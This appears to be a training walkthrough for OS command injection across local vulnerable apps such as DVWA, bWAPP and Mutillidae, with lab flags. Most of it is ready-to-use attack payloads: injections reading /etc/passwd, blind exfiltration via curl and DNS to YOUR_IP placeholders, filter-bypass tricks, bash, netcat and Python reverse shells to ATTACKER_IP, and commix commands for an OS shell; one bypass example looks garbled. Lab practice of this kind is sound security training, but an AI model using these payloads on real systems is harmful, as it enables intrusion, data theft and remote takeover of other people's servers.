# Command Injection Walkthrough

Step-by-step exercises for mastering OS command injection attacks across multiple vulnerable platforms.

---

## Lab 1: DVWA - Basic Command Injection

### Environment Setup

1. Start the CyberLab environment:
```bash
cd /path/to/cyberlab
docker-compose up -d dvwa
```

2. Access DVWA at `http://localhost:8081`

3. Login with default credentials: `admin` / `password`

4. Navigate to **DVWA Security** and set security level to **Low**

### Exercise 1: Understanding the Vulnerability

**Target:** Command Injection page

1. Navigate to **Command Injection** in the left menu

2. You'll see a ping utility that accepts an IP address

3. Enter a normal IP and observe:
   - Input: `127.0.0.1`
   - Output: Ping results for localhost

4. Examine what happens behind the scenes:
```php
// Vulnerable code pattern
shell("ping -c 4 " + user_input)
```

### Exercise 2: Basic Injection

1. Try semicolon separator:
   - Input: `127.0.0.1; id`
   - Expected: Ping output followed by user ID

2. Try other separators:
   - `127.0.0.1 && id`
   - `127.0.0.1 | id`
   - `127.0.0.1 || id` (this may not work if ping succeeds)

3. Read sensitive files:
   - Input: `127.0.0.1; cat /etc/passwd`

4. Check current directory:
   - Input: `127.0.0.1; pwd`
   - Input: `127.0.0.1; ls -la`

**Flag: `FLAG{cmd_1nj3ct_b4s1c}`**

### Exercise 3: Medium Security

1. Set DVWA security to **Medium**

2. Try basic injection - it may be blocked

3. Check what's filtered (likely `&&` and `;`)

4. Try alternative separators:
   - `127.0.0.1 | id`
   - `127.0.0.1 & id`

### Exercise 4: High Security

1. Set DVWA security to **High**

2. More characters are filtered

3. Try pipe with no spaces:
   - `127.0.0.1|id`

4. Observe the filter is looking for `| ` (pipe with space)

---

## Lab 2: bWAPP - Command Injection

### Setup

```bash
# Access bWAPP
http://localhost:8082/bWAPP
# Login: bee / bug
```

### OS Command Injection

**Location:** A1 - Injection > OS Command Injection

1. Navigate to the vulnerability page

2. You'll see a DNS lookup form

3. Test basic injection:
   - Input: `www.google.com; id`

4. Read files:
   - Input: `www.google.com; cat /etc/passwd`

### OS Command Injection (Blind)

**Location:** A1 - Injection > OS Command Injection (Blind)

1. Navigate to the blind injection page

2. No output is returned - use time delays:
   - Input: `www.google.com; sleep 5`
   - If page takes 5 seconds longer, injection works

3. Confirm with different delays:
   - Input: `www.google.com; sleep 10`

4. For data exfiltration, use DNS or HTTP:
   - Input: `www.google.com; curl http://YOUR_IP/?data=$(whoami)`

---

## Lab 3: WebGoat - Command Injection

### Setup

```bash
# Access WebGoat
http://localhost:8080/WebGoat
```

### Command Injection Lessons

1. Navigate to A1 Injection > Command Injection

2. Complete the introduction lessons

3. For practical exercise:
   - Find the network utility
   - Inject commands after the expected input

### Mitigation Bypass

1. Learn about filters in place

2. Try URL encoding:
   - `%3B` for `;`
   - `%26` for `&`
   - `%7C` for `|`

---

## Lab 4: Blind Command Injection Techniques

### Time-Based Detection

1. Baseline request time

2. Inject sleep command:
```
; sleep 5
&& sleep 5
| sleep 5
```

3. Measure response time difference

4. Confirm with variable delays:
```
; sleep 1  (baseline + 1 second)
; sleep 5  (baseline + 5 seconds)
; sleep 10 (baseline + 10 seconds)
```

### Out-of-Band Detection

1. Set up listener:
```bash
# HTTP listener
python3 -m http.server 8888

# Or use Burp Collaborator / interactsh
```

2. Inject callback:
```
; curl http://YOUR_IP:8888/
; wget http://YOUR_IP:8888/
; nslookup YOUR_DOMAIN
```

3. Check listener for incoming requests

### Data Exfiltration

1. Via HTTP:
```
; curl http://YOUR_IP:8888/?data=$(cat /etc/passwd | base64 | tr -d '\n')
```

2. Via DNS:
```
; nslookup $(whoami).YOUR_DOMAIN
; host $(id | base64 | head -c 60).YOUR_DOMAIN
```

**Flag: `FLAG{bl1nd_cmd_t1m3}`**

---

## Lab 5: Filter Bypass Techniques

### Bypassing Space Filters

If spaces are blocked:

```bash
# Using $IFS (Internal Field Separator)
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

# Using tabs
cat%09/etc/passwd

# Using brace expansion
{cat,/etc/passwd}

# Using redirection
cat</etc/passwd
```

### Bypassing Character Filters

If certain characters are blocked:

```bash
# Bypass using hex encoding
$(printf '\x69\x64')  # id

# Using base64
$(echo aWQ= | base64 -d)  # id

# Using variable manipulation
a]d;$a  # becomes id

# Using wildcards
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
```

### Bypassing Keyword Filters

If 'cat' or 'id' is blocked:

```bash
# Alternative commands
tac /etc/passwd
head /etc/passwd
tail /etc/passwd
less /etc/passwd
more /etc/passwd
nl /etc/passwd

# String concatenation
c''at /etc/passwd
c""at /etc/passwd
c\at /etc/passwd

# Using variables
a=c;b=at;$a$b /etc/passwd
```

### Bypassing with Encoding

```bash
# URL encoding
%3B%20id  # ; id

# Double URL encoding
%253B%2520id

# Unicode
%u003b%u0020id
```

**Flag: `FLAG{byp4ss_f1lt3rs}`**

---

## Lab 6: Reverse Shell Techniques

### Bash Reverse Shell

```bash
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

### Netcat Reverse Shell

```bash
; nc ATTACKER_IP 4444 -e /bin/bash
; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### Python Reverse Shell

```bash
; python -c 'import socket,subprocess;s=socket.socket();s.connect(("ATTACKER_IP",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

### Setting Up Listener

```bash
# On attacker machine
nc -lvnp 4444
```

---

## Lab 7: Mutillidae - Command Injection

### Setup

```bash
# Access Mutillidae
http://localhost:8083/mutillidae
```

### DNS Lookup Page

**Location:** OWASP 2017 > A1 - Injection > Command Injection > DNS Lookup

1. Navigate to the DNS lookup page

2. Test normal functionality:
   - Input: `www.google.com`

3. Inject commands:
   - Input: `www.google.com; id`
   - Input: `www.google.com && cat /etc/passwd`

### System Information Pages

Look for other system information pages that might execute commands:
- Network configuration
- Server status
- Log viewers

---

## Lab 8: Automated Testing with Commix

### Basic Usage

```bash
# Install commix
git clone https://github.com/commixproject/commix.git

# Basic scan
python commix.py --url="http://target.com/page?param=test"

# With specific technique
python commix.py --url="http://target.com/page?param=test" --technique=classic

# With authentication
python commix.py --url="http://target.com/page?param=test" --cookie="PHPSESSID=abc123"
```

### Exploitation Options

```bash
# Get shell
python commix.py --url="http://target.com/page?param=test" --os-shell

# Execute specific command
python commix.py --url="http://target.com/page?param=test" --os-cmd="id"

# File read
python commix.py --url="http://target.com/page?param=test" --file-read="/etc/passwd"
```

---

## Verification Checklist

- [ ] Successfully injected commands in DVWA (Low, Medium, High)
- [ ] Exploited bWAPP command injection
- [ ] Performed blind command injection with time delays
- [ ] Exfiltrated data via HTTP/DNS
- [ ] Bypassed space and character filters
- [ ] Obtained a reverse shell
- [ ] Used Commix for automated testing

---

## Next Steps

After completing these labs:

1. Practice on HackTheBox and TryHackMe
2. Learn Windows command injection
3. Study WAF bypass techniques
4. Explore containerized environment escapes
5. Study CI/CD pipeline injection
